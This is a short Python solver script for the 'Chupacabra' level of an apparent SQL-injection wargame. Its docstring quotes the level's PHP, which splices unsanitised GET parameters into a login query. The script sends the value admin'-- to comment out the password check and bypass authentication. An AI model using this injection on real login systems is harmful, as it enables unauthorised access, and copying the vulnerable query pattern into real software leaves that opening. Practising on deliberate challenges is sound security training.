#!/usr/bin/env python3
import los


def main():
    '''
    Chupacabra

    $db = sqlite_open("./db/chupacabra.db");
    $query = "select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = sqlite_fetch_array(sqlite_query($db,$query));
    if($result['id'] == "admin") solve("chupacabra");
    '''

    url = "https://los.rubiya.kr/chall/chupacabra_8568ab6205bea61d634a8cc67484a35c.php"
    cook = los.check_cookies(url)

    param = dict(id="admin'-- ")

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Chupacabra Clear!')


if __name__ == '__main__':
    main()

